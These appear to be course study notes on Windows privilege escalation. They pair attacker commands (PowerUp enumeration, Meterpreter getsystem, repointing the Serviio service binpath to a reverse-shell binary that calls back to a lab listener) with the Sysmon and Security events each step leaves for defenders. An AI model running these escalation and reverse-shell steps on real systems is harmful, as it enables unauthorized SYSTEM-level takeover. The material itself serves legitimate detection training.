# Module 6: Windows Privilege Escalation

## Privilege Escalation Introduction

### Privilege Escalation Enumeration

Privileges are the permissions of a specific account to perform system-related local operations. i.e. modifying the filesystem, adding users, shutting down the system, etc.

For these to be effective, Windows uses _access tokens_. These tokens are uniquely identified via a _security identifier_ or _SID_. These are generated/maintained by the _Local Security Authority_.

From Windows Vista onward, processes run on four integrity levels, which align with various rights:

* System integrity process: SYSTEM rights
* High integrity process: administrative rights
* Medium integrity process: standard user rights
* Low integrity process: very restricted rights often used in [_sandboxed_](https://en.wikipedia.org/wiki/Sandbox_\(software_development\)) processes

_Using AccessChk from SysInternals to search for files or directories with Everyone having write permissions_

{% code overflow="wrap" %}
```powershell
PS C:\tools\windows_privilege_escalation> .\accesschk64.exe -uws "Everyone" "C:\Program Files (x86)\"

Accesschk v6.13 - Reports effective permissions for securable objects
Copyright - 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

RW C:\Program Files (x86)\IObit
```
{% endcode %}

PowerUp is another useful tool for identifying several common Windows misconfigurations.

_PowerUp privilege escalation enumeration_

{% code overflow="wrap" %}
```powershell
PS C:\tools\windows_privilege_escalation> Import-Module .\PowerUp.ps1

PS C:\tools\windows_privilege_escalation> Invoke-AllChecks | Format-List

...
Check         : User In Local Group with Admin Privileges
AbuseFunction : Invoke-WScriptUACBypass -Command "..."

...
ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=Everyone;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths
...
ServiceName   : Serviio
Path          : 'C:\Program Files\Serviio\bin\ServiioService.exe'
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'Serviio'
CanRestart    : True
Name          : Serviio
Check         : Modifiable Services
```
{% endcode %}

### User Account Control

User Account Control (UAC) is a Microsoft access control system introduced in Windows Vista and Windows Server 2008. The goal of UAC is that any application wishing to perform an operation with potentially system-wide impact, must inform the user and request approval to do so.

### Bypassing UAC

{% embed url="https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/" %}

{% hint style="info" %}
FodHelper is just one method of bypassing UAC for elevated privileges. The [_Living Off The Land Binaries and Scripts_](https://lolbas-project.github.io/#/uac) project details other Windows-based privilege escalation techniques including bypasses for UAC. The MITRE website also details various UAC bypass techniques used by [_APTs_](https://attack.mitre.org/techniques/T1548/002/).
{% endhint %}

## Escalating to SYSTEM

### Service Creation

_Options for getsystem in Meterpreter_

```bash
meterpreter > getsystem -h
Usage: getsystem [options]

Attempt to elevate your privilege to that of local system.

OPTIONS:

    -h        Help Banner.
    -t <opt>  The technique to use. (Default to '0').
                0 : All techniques available
                1 : Named Pipe Impersonation (In Memory/Admin)
                2 : Named Pipe Impersonation (Dropper/Admin)
                3 : Token Duplication (In Memory/Admin)
                4 : Named Pipe Impersonation (RPCSS variant)
```

_Successful elevation of privileges using getsystem_

{% code overflow="wrap" %}
```bash
meterpreter > localtime
Local Date/Time: 2021-06-30 12:49:27.569 Eastern Daylight Time (UTC-500)

meterpreter > getsystem 1
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
```
{% endcode %}

_Meterpreter now running with SYSTEM-level privileges_

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

_Importing Get-Security.psm1_

{% code overflow="wrap" %}
```powershell
[192.168.51.10]: PS C:\tools\windows_privilege_escalation> Import-Module C:\Sysmon\Get-Security.psm1
[192.168.51.10]: PS C:\tools\windows_privilege_escalation> 
```
{% endcode %}

_New Service created events_

{% code overflow="wrap" %}
```powershell
[192.168.51.10]: PS C:\tools\windows_privilege_escalation> Get-SecurityEvent $null "6/30/2021 12:49:00" "6/30/2021 12:50:00"

   ProviderName: Microsoft-Windows-Security-Auditing
                                       
TimeCreated              Id LevelDisplayName Message                                       
-----------              -- ---------------- -------
...
6/30/2021 12:49:32 PM  4697 Information      A service was installed in the system....
```
{% endcode %}

New Service installed events use event ID 4697.

_Details of New Windows Service event_

{% code overflow="wrap" %}
```powershell
[192.168.51.10]: PS C:\tools\windows_privilege_escalation> Get-SecurityEvent 4697 "6/30/2021 12:49:31" "6/30/2021 12:49:33" | Format-List

TimeCreated  : 6/30/2021 12:49:32 PM
ProviderName : Microsoft-Windows-Security-Auditing
Id           : 4697
Message      : A service was installed in the system.
               
               Subject:
                Security ID:            S-1-5-21-1241977418-156118851-1443169900-1001
                Account Name:           offsec
                Account Domain:         CLIENT01
                Logon ID:               0xCD626
               
               Service Information:
                Service Name:           hvaukz
                Service File Name:      cmd.exe /c echo hvaukz > \\.\pipe\hvaukz
                Service Type:           0x10
                Service Start Type:     3
                Service Account:        LocalSystem
```
{% endcode %}

_Sysmon events generated_

{% code overflow="wrap" %}
```powershell
[192.168.51.10]: PS C:\tools\windows_privilege_escalation> Import-Module C:\Sysmon\Get-Sysmon.psm1

[192.168.51.10]: PS C:\tools\windows_privilege_escalation> Get-SysmonEvent $null "06/30/2021 12:49:31" "06/30/2021 12:50:00"

   ProviderName: Microsoft-Windows-Sysmon

TimeCreated                      Id LevelDisplayName Message
-----------                      -- ---------------- -------
...
6/30/2021 12:49:32 PM            13 Information      Registry value set:...
6/30/2021 12:49:32 PM             1 Information      Process Create:...
6/30/2021 12:49:32 PM            13 Information      Registry value set:...
6/30/2021 12:49:32 PM            13 Information      Registry value set:...  
```
{% endcode %}

_Reviewing the RegistryEvents_

{% code overflow="wrap" %}
```powershell
[192.168.51.10]: PS C:\tools\windows_privilege_escalation> Get-SysmonEvent 13 "06/30/2021 12:49:31" "06/30/2021 12:49:33" | Format-List

TimeCreated  : 6/30/2021 12:49:32 PM
ProviderName : Microsoft-Windows-Sysmon
Id           : 13
Message      : Registry value set:
               RuleName: T1031,T1050
               EventType: SetValue
               UtcTime: 2021-06-30 16:49:32.936
               ProcessGuid: {71c0553d-db66-60d9-0a00-000000002900}
               ProcessId: 640
               Image: C:\Windows\system32\services.exe
               TargetObject: HKLM\System\CurrentControlSet\Services\hvaukz\Start
               Details: DWORD (0x00000004)

TimeCreated  : 6/30/2021 12:49:32 PM
ProviderName : Microsoft-Windows-Sysmon
Id           : 13
Message      : Registry value set:
               RuleName: T1031,T1050
               EventType: SetValue
               UtcTime: 2021-06-30 16:49:32.921
               ProcessGuid: {71c0553d-db66-60d9-0a00-000000002900}
               ProcessId: 640
               Image: C:\Windows\system32\services.exe
               TargetObject: HKLM\System\CurrentControlSet\Services\hvaukz\ImagePath
               Details: cmd.exe /c echo hvaukz > \\.\pipe\hvaukz

TimeCreated  : 6/30/2021 12:49:32 PM
ProviderName : Microsoft-Windows-Sysmon
Id           : 13
Message      : Registry value set:
               RuleName: T1031,T1050
               EventType: SetValue
               UtcTime: 2021-06-30 16:49:32.921
               ProcessGuid: {71c0553d-db66-60d9-0a00-000000002900}
               ProcessId: 640
               Image: C:\Windows\system32\services.exe
               TargetObject: HKLM\System\CurrentControlSet\Services\hvaukz\Start
               Details: DWORD (0x00000003)
```
{% endcode %}

_Reviewing the ProcessCreate event_

{% code overflow="wrap" %}
```powershell
[192.168.51.10]: PS C:\tools\windows_privilege_escalation> Get-SysmonEvent 1 "06/30/2021 12:49:31" "06/30/2021 12:49:33" | Format-List

TimeCreated  : 6/30/2021 12:49:32 PM
ProviderName : Microsoft-Windows-Sysmon
Id           : 1
Message      : Process Create:
               RuleName: -
               UtcTime: 2021-06-30 16:49:32.937
               ProcessGuid: {71c0553d-a09c-60dc-6b05-000000002900}
               ProcessId: 7684
               Image: C:\Windows\System32\cmd.exe
               FileVersion: 10.0.19041.746 (WinBuild.160101.0800)
               Description: Windows Command Processor
               Product: Microsoft® Windows® Operating System
               Company: Microsoft Corporation
               OriginalFileName: Cmd.Exe
               CommandLine: cmd.exe /c echo hvaukz > \\.\pipe\hvaukz
               CurrentDirectory: C:\Windows\system32\
               User: NT AUTHORITY\SYSTEM
               LogonGuid: {71c0553d-db66-60d9-e703-000000000000}
               LogonId: 0x3E7
               TerminalSessionId: 0
               IntegrityLevel: System
               Hashes: MD5=8A2...
               ParentProcessGuid: {71c0553d-db66-60d9-0a00-000000002900}
               ParentProcessId: 640
               ParentImage: C:\Windows\System32\services.exe
               ParentCommandLine: C:\Windows\system32\services.exe
```
{% endcode %}

_Checking if the keys or services still exist_

{% code overflow="wrap" %}
```powershell
[192.168.51.10]: PS C:\tools\windows_privilege_escalation> Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\hvaukz

Get-ItemProperty : Cannot find path
'HKLM:\SYSTEM\CurrentControlSet\Services\hvaukz' because it does not exist.
    + CategoryInfo : ObjectNotFound:
    (HKLM:\SYSTEM\Cu...Services\hvaukz:String) [Get-ItemProperty],
    ItemNotFoundException
    + FullyQualifiedErrorId :
    PathNotFound,Microsoft.PowerShell.Commands.GetItemPropertyCommand
                                    
[192.168.51.10]: PS C:\tools\windows_privilege_escalation> Get-Service hvaukz

Get-Service : Cannot find any service with service name 'hvaukz'.
    + CategoryInfo : ObjectNotFound: (hvaukz:String) [Get-Service],
    ServiceCommandException
    + FullyQualifiedErrorId :
    NoServiceFoundForGivenName,Microsoft.PowerShell.Commands.GetServiceCommand
```
{% endcode %}

### Attacking Service Permissions

In some cases an attacker can just modify an existing service directly rather than creating their own.

_Querying the Update Orchestrator Service_

```powershell
PS C:\tools\windows_privilege_escalation> sc.exe qc usosvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: usosvc
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START  (DELAYED)
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k netsvcs -p
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Update Orchestrator Service
        DEPENDENCIES       : rpcss
        SERVICE_START_NAME : LocalSystem
```

{% hint style="info" %}
When querying services with Service Control in PowerShell, we need to use the sc.exe filename and not just sc. The _Set-Content_ cmdlet in PowerShell can be abbreviated with _sc_, and the PowerShell prompt prioritizes cmdlets over Windows commands.
{% endhint %}

_Enumerating permissions of a service with accesschk64.exe_

{% code overflow="wrap" %}
```powershell
PS C:\tools\windows_privilege_escalation> .\accesschk64.exe -c Serviio -l
Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

Serviio
  DESCRIPTOR FLAGS:
      [SE_DACL_PRESENT]
      [SE_SACL_PRESENT]
      [SE_SELF_RELATIVE]
  OWNER: NT AUTHORITY\SYSTEM
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [1] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  [2] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\INTERACTIVE
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [3] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SERVICE
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\Authenticated Users
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_CHANGE_CONFIG
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL
```
{% endcode %}

All authenticated users have access to SERVICE\_CHANGE\_CONFIG, SERVICE\_START, and SERVICE\_STOP.

_Querying the Serviio service_

```powershell
PS C:\tools\windows_privilege_escalation> sc.exe qc Serviio
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: Serviio
        TYPE               : 110  WIN32_OWN_PROCESS (interactive)
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Serviio\bin\ServiioService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Serviio
        DEPENDENCIES       : HTTP
        SERVICE_START_NAME : LocalSystem
```

_Modifying the service to point to a reverse shell instead_

{% code overflow="wrap" %}
```powershell
PS C:\tools\windows_privilege_escalation> C:\Windows\system32\sc.exe config Serviio binpath= 'C:\tools\windows_privilege_escalation\servshell_443.exe'
[SC] ChangeServiceConfig SUCCESS

PS C:\tools\windows_privilege_escalation> Get-Date

Thursday, July 1, 2021 10:42:42 AM
```
{% endcode %}

_Starting the Serviio service_

```powershell
PS C:\tools\windows_privilege_escalation> net start serviio
The Serviio service is starting.
The Serviio service could not be started.

The service did not report an error.

More help is available by typing NET HELPMSG 3534.
```

This fails, however that is just because the binary does not behave like a service and thus the error can be ignored. Checking the meterpreter shell shows it ran just fine.

```powershell
[*] https://192.168.51.50:443 handling request from 192.168.51.10;
(UUID: ia20jikd) Staging x64 payload (201308 bytes) ...
[*] Meterpreter session 1 opened (192.168.51.50:443 ->
192.168.51.10:51100) at 2021-07-01 10:56:10 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

_ProcessCreate event showing the modification to the service_

{% code overflow="wrap" %}
```powershell
[192.168.51.10]: PS C:\tools\windows_privilege_escalation> Get-SysmonEvent 1 "7/1/2021 10:42:00" "7/1/2021 10:42:59" | Format-List


TimeCreated  : 7/1/2021 10:42:38 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 1
Message      : Process Create:
               RuleName: -
               UtcTime: 2021-07-01 14:42:38.812
               ProcessGuid: {71c0553d-d472-60dd-6a02-000000002a00}
               ProcessId: 4060
               Image: C:\Windows\System32\sc.exe
               FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
               Description: Service Control Manager Configuration Tool
               Product: Microsoft® Windows® Operating System
               Company: Microsoft Corporation
               OriginalFileName: sc.exe
               CommandLine: "C:\Windows\system32\sc.exe" config Serviio binpath= C:\tools\windows_privilege_escalation\servshell_443.exe
               CurrentDirectory: C:\tools\windows_privilege_escalation\
               User: CLIENT01\offsec
               LogonGuid: {71c0553d-bbdf-60dc-7ef2-010000000000}
               LogonId: 0x1F27E
               TerminalSessionId: 1
               IntegrityLevel: Medium
               Hashes: MD5=3FB5CF71F7E7EB49790CB0E663434D80,SHA256=41F067C3A11B02FE39947F9EBA68AE5C7CB5BD1872A6009A4CD1506554A9ABA9,IMPHASH=803254E010814E69947095A2725B2AFD
               ParentProcessGuid: {71c0553d-cb31-60dc-2501-000000002a00}
               ParentProcessId: 6856
               ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
               ParentCommandLine: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
```
{% endcode %}

_RegistryEvent entry for the service change as well_

{% code overflow="wrap" %}
```powershell
[192.168.51.10]: PS C:\tools\windows_privilege_escalation> Get-SysmonEvent 13 "7/1/2021 10:42:00" "7/1/2021 10:42:59" | Format-List


TimeCreated  : 7/1/2021 10:42:38 AM
ProviderName : Microsoft-Windows-Sysmon
Id           : 13
Message      : Registry value set:
               RuleName: T1031,T1050
               EventType: SetValue
               UtcTime: 2021-07-01 14:42:38.834
               ProcessGuid: {71c0553d-bbdd-60dc-0b00-000000002a00}
               ProcessId: 704
               Image: C:\Windows\system32\services.exe
               TargetObject: HKLM\System\CurrentControlSet\Services\Serviio\ImagePath
               Details: C:\tools\windows_privilege_escalation\servshell_443.exe
```
{% endcode %}

_ProcessCreate events from starting the service_

{% code overflow="wrap" %}
```powershell
[192.168.51.10]: PS C:\tools\windows_privilege_escalation> Get-SysmonEvent $null "7/1/2021 10:56:00" "7/1/2021 10:56:20"

   ProviderName: Microsoft-Windows-Sysmon

TimeCreated                       Id LevelDisplayName Message
-----------                       -- ---------------- -------
...
7/1/2021 10:56:10 AM               1 Information      Process Create:...
7/1/2021 10:56:10 AM               1 Information      Process Create:...
7/1/2021 10:56:10 AM               1 Information      Process Create:...
```
{% endcode %}

_Chain of ProcessCreate events after starting the service_

{% code overflow="wrap" %}
```powershell
[192.168.51.10]: PS C:\tools\windows_privilege_escalation> Get-SysmonEvent 1 "7/1/2021 10:56:09" "7/1/2021 10:56:11" | Format-List @{ Label = 'UtcTime'; Expression = { $_.properties[1].value }}, @{ Label = 'Image'; Expression = { $_.properties[4].value }}, @{ Label = 'ProcessId'; Expression = { $_.properties[3].value }}, @{ Label = 'CommandLine'; Expression = { $_.properties[10].value }}, @{Label = 'User'; Expression = { $_.properties[12].value }}, @{ Label = 'ParentImage'; Expression = { $_.properties[20].value }}, @{ Label = 'ParentProcessId'; Expression = { $_.properties[19].value }}

UtcTime         : 2021-07-01 14:56:10.532
Image           : C:\tools\windows_privilege_escalation\servshell_443.exe
ProcessId       : 5668
CommandLine     : C:\tools\windows_privilege_escalation\servshell_443.exe
User            : NT AUTHORITY\SYSTEM
ParentImage     : C:\Windows\System32\services.exe
ParentProcessId : 704

UtcTime         : 2021-07-01 14:56:10.511
Image           : C:\Windows\System32\net1.exe
ProcessId       : 6168
CommandLine     : C:\Windows\system32\net1 start serviio
User            : CLIENT01\offsec
ParentImage     : C:\Windows\System32\net.exe
ParentProcessId : 4392

UtcTime         : 2021-07-01 14:56:10.493
Image           : C:\Windows\System32\net.exe
ProcessId       : 4392
CommandLine     : "C:\Windows\system32\net.exe" start serviio
User            : CLIENT01\offsec
ParentImage     : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentProcessId : 3700
```
{% endcode %}

### Leveraging Unquoted Service Paths

Unquoted service paths can allow an attacker to place an executable file along the path to be executed.

Example: A service binary is stored in a path such as **C:\Program Files\My Program\My Service\service.exe**. If this is unquoted then Windows will attempt to execute a binary from the following paths:

* **C:\Program.exe**
* **C:\Program Files\My.exe**
* **C:\Program Files\My Program\My.exe**
* **C:\Program Files\My Program\My Service\service.exe**

_Querying service to identify its path_

{% code overflow="wrap" %}
```powershell
PS C:\tools\windows_privilege_escalation> sc.exe qc IOBitUnSvr
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: IOBitUnSvr
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : IObit Uninstaller Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```
{% endcode %}
